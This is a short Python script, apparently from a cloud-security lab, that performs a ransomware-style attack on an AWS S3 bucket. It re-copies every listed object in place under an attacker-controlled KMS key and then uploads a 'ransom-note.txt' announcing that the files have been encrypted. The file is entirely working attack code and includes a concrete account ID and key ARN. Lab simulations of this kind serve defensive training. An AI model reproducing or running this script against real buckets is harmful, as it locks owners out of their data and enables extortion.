#!/usr/bin/env python3

import boto3

#################################
############ Config #############
#################################
aws_cli_profile = 'default'  # The AWS CLI profile to use for the attack
bucket_name = 'proservlab-s3-bucket-to-target'  # The S3 bucket to target with the attack
kms_key_arn = 'arn:aws:kms:us-east-1:997124715511:key/04226edd-51bd-4d33-960e-3c3de9579c81'  # The KMS key ARN to use for the attack (must be in the same region as the S3 bucket)
#################################

# to test encrypted file try to read with target account user
# aws s3 cp s3://proservlab-s3-bucket-to-target/file_uploaded_by_boto3.txt -

session = boto3.Session(profile_name=aws_cli_profile)

client = session.client('s3')
objects = client.list_objects_v2(Bucket=bucket_name, MaxKeys=100)['Contents']

s3 = session.resource('s3')
for obj in objects:
    s3.meta.client.copy({'Bucket': bucket_name, 'Key': obj['Key']}, bucket_name, f"{obj['Key']}", ExtraArgs={'ServerSideEncryption': 'aws:kms', 'SSEKMSKeyId': kms_key_arn})
print(f'Complete! Encrypted {len(objects)} objects!')

txt_data = b'---------------------------------\nYOUR FILES HAVE BEEN ENCRYPTED\n---------------------------------'
object = s3.Object(bucket_name, 'ransom-note.txt')
result = object.put(Body=txt_data)
print(f'Uploaded ransom-note.txt')